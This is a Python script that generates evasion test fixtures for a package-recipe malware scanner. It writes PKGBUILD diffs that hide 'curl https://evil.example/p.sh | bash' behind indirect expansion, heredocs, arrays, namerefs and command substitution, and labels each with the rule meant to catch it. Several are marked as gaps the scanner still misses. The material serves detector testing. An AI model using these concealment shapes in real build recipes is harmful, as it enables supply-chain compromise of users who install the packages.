"""Generate the evasion recall fixtures (plan §14).

Evasion recipe shapes, written down *before* they are closed and kept as the
record of what the engine can and cannot yet see.

Each fixture is labelled with the rule that is *meant* to catch it and the
score it is meant to reach.  A fixture in one of two states:

* ``known_gap=True`` - the label is one the engine currently *fails*.  This
  is the direction ``gate_known_gaps_unchanged`` reads: an open gap has to
  be a failing label, so the gate stays green while the shape evades us and
  turns red the moment a patch detects it, forcing the flag to come off.

* ``known_gap=False`` - a shape a later patch closed.  The flag is dropped
  and the fixture must now *pass* its label; ``gate_malicious_recall`` picks
  it up and pins the coverage so it cannot silently regress.

The self-check below enforces both directions, so a fixture cannot sit in
the wrong state: an open gap that already passes and a covered fixture that
still fails are both reported.

The self-check below calls the gate's own ``_fixture_failures`` rather than
re-deriving the condition, so the two cannot drift apart again.

Like ``gen_campaign_fixtures.py`` this script owns exactly one directory and
never deletes a file it did not write.

Usage:
    python scripts/gen_evasion_fixtures.py [--out tests/fixtures/malicious/evasion]
"""

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from calibration_gates import _fixture_failures, shipped_config
from trustsight.analysis import scan_diff
from trustsight.config import ensure_default_configs, load_config
from trustsight.rules import load_rules

FIXTURES: list[dict] = []


def add(name: str, body: str, **expect) -> None:
    FIXTURES.append({"name": name, "diff_text": body, "expect": expect})


def diff(*added: str, context: str = "pkgname=demo\npkgver=1.0") -> str:
    """A one-file unified diff whose hunk adds *added*."""
    ctx = context.splitlines()
    plus = "\n".join("+" + line for line in added)
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        f"@@ -1,{len(ctx)} +1,{len(ctx) + len(added)} @@\n"
        + "".join(f" {line}\n" for line in ctx)
        + plus
        + "\n"
    )


# ── 1. The fetch command is routed through an indirect expansion ─────────────

add("evasion-fetch-via-indirect",
    diff(
        "C=curl",
        "${!C} https://evil.example/p.sh | bash",
    ),
    description="The fetch tool is reached through ${!C} indirection, so the "
                "resolved line keeps no literal curl/wget for R001/R002/H016 "
                "and H077 to name",
    known_gap=False, must_fire=["H080"], min_score=40)

# ── 2. The shell at the far end of the pipe is an indirect expansion ─────────

add("evasion-shell-via-indirect",
    diff(
        "P=bash",
        "C=curl",
        "$C https://evil.example/p.sh | ${!P}",
    ),
    description="curl is variable-routed and the shell is reached through "
                "${!P}: R001's shell alternation names literals only",
    known_gap=False, must_fire=["H080"], min_score=40)

# ── 3. The fetch tool is accumulated with += ─────────────────────────────────

add("evasion-command-via-plus-eq",
    diff(
        "C+=curl",
        "C+=' https://evil.example/p.sh'",
        "$C | bash",
    ),
    description="C is assembled only with +=, so no single line carries a "
                "literal curl; once the resolver accumulates +=, $C resolves "
                "to `curl https://evil.example/p.sh | bash` and R001 owns it",
    # Not H080: nothing here is *indirect*.  Once the tokenizer accumulates
    # +=, $C resolves to a literal `curl ... | bash` and R001 owns it.
    known_gap=False, must_fire=["R001"], min_score=40)

# ── 4. A dependency is accumulated with += ───────────────────────────────────

add("evasion-depends-via-plus-eq",
    diff(
        "depends+=('evil-pkg' 'evil-pkg2')",
    ),
    description="depends+= is not parsed as a dependency declaration, so "
                "nothing reports it (cold DB) and D003 sees no network "
                "makedepends",
    # This one stays open after Phase 3, deliberately.  Parsing depends+=
    # is the reachable half; the scoring half is D001, which is corpus-based
    # and silent on the cold database the gates run against - a plain
    # depends=(...) scores 0 here too.  Labelling it for D001 records the
    # rule that would have to fire for the shape to be covered, and leaves
    # the fixture honestly failing until a warmed-corpus gate exists.
    known_gap=True, must_fire=["D001"], min_score=25)

# ── 5. A heredoc feeds a shell a variable-routed pipe ────────────────────────

add("evasion-heredoc-fed-indirect",
    diff(
        "C=curl",
        "bash <<'EOF'",
        "${!C} https://evil.example/p.sh | bash",
        "EOF",
    ),
    description="The remote-execution line lives inside a heredoc fed "
                "straight to a shell; the literal pipe-to-shell rules never "
                "see it once the fetch is indirect",
    known_gap=False, must_fire=["H080"], min_score=40)

# ── 6. A heredoc writes a script that is then sourced ────────────────────────

add("evasion-heredoc-written-indirect",
    diff(
        "build() {",
        "  cat <<'EOF' > $srcdir/h.sh",
        "  C=curl",
        "  ${!C} https://evil.example/p.sh | bash",
        "EOF",
        "  . $srcdir/h.sh",
        "}",
    ),
    description="The recipe writes an executable script into $srcdir and "
                "sources it; H069/H072 want the writer and the executor in "
                "the same visible line, and the fetch inside is indirect",
    known_gap=False, must_fire=["H080"], min_score=40)


# ── 7. The fetch tool is an array element ────────────────────────────────────

add("evasion-command-via-array-index",
    diff(
        "A=(curl)",
        "${A[0]} https://evil.example/p.sh | bash",
    ),
    description="curl is stored as an array element and reached through "
                "${A[0]}; the resolver folds A only as a whole, never by "
                "subscript, and ${A[0]} is not the ${!name} form H080 reads, "
                "so the fetch line keeps no literal curl",
    known_gap=True, must_fire=["R133"], min_score=40)

# ── 8. The fetch tool is reached through a nameref ───────────────────────────

add("evasion-command-via-nameref",
    diff(
        "declare -n R=curl",
        "$R https://evil.example/p.sh | bash",
    ),
    description="declare -n makes R a nameref for curl; the assignment "
                "resolver does not parse `declare -n name=target`, so $R "
                "never resolves and the fetch line keeps no literal curl",
    known_gap=True, must_fire=["R134"], min_score=40)

# ── 9. The fetch tool is assembled in a command substitution ─────────────────

add("evasion-command-via-command-subst",
    diff(
        "C=$(printf '%s%s' cur l)",
        "$C https://evil.example/p.sh | bash",
    ),
    description="curl is spelled by a printf inside $( ), which the resolver "
                "refuses to fold (no static value), so $C stays unresolved "
                "and no literal curl - split across 'cur' and 'l' - survives "
                "on any line",
    known_gap=True, must_fire=["R135"], min_score=40)


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate evasion fixtures")
    parser.add_argument("--out", type=Path,
                        default=Path(__file__).resolve().parent.parent
                        / "tests" / "fixtures" / "malicious" / "evasion")
    args = parser.parse_args()

    args.out.mkdir(parents=True, exist_ok=True)

    expected: dict = {}
    failures: list[str] = []

    with shipped_config():
        ensure_default_configs()
        config = load_config()
        rules = load_rules()

        for fx in FIXTURES:
            fname = fx["name"] + ".diff"
            fpath = args.out / fname
            fpath.write_text(fx["diff_text"])

            known_gap = fx["expect"].get("known_gap", True)
            entry: dict = {}
            if known_gap:
                entry["known_gap"] = True
            for key in ("description", "must_fire", "min_score"):
                if key in fx["expect"]:
                    entry[key] = fx["expect"][key]
            expected[fname] = entry

            # Scanned exactly as `scan_malicious` scans it, so the verdict
            # here is the verdict the gate will reach.
            fact = scan_diff(fx["diff_text"], rules=rules, config=config,
                             package_name=fpath.stem, seen_urls={})
            result = {
                "name": fname,
                "score": fact.final_score,
                "fired": {e.rule_id for e in fact.score_breakdown},
                "scored": {
                    e.rule_id for e in fact.score_breakdown
                    if e.weight != 0 or e.severity == "FATAL"
                },
                "expected": entry,
            }
            # An open gap must *fail* its label, and a fixture relabelled
            # covered must *pass* it.  Both directions are checked here so a
            # patch that closes a gap cannot leave the label stale: filing a
            # detected shape under "we do not detect this" (known_gap that
            # passes) and claiming coverage the engine does not have
            # (known_gap dropped but still failing) are both rejected.
            fails = _fixture_failures(result)
            if known_gap and not fails:
                failures.append(
                    f"{fname}: labelled a known gap but already passes its "
                    f"label - score {fact.final_score}, fired {sorted(result['fired'])}. "
                    "Drop known_gap and move it to the labelled corpus."
                )
            elif not known_gap and fails:
                failures.append(
                    f"{fname}: labelled covered but still fails its label - "
                    + "; ".join(fails)
                )

    with open(args.out / "expected.json", "w") as f:
        json.dump(expected, f, indent=2, ensure_ascii=False)
        f.write("\n")

    for fname in sorted(expected):
        print(f"  {fname}")

    if failures:
        print(f"\nFAILURES ({len(failures)}):", file=sys.stderr)
        for fb in failures:
            print(f"  {fb}", file=sys.stderr)
        return 1
    open_gaps = sum(1 for fx in FIXTURES if fx["expect"].get("known_gap", True))
    covered = len(FIXTURES) - open_gaps
    print(f"\n{open_gaps} open gaps still fail their labels; {covered} "
          "relabelled-covered fixtures now pass theirs.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
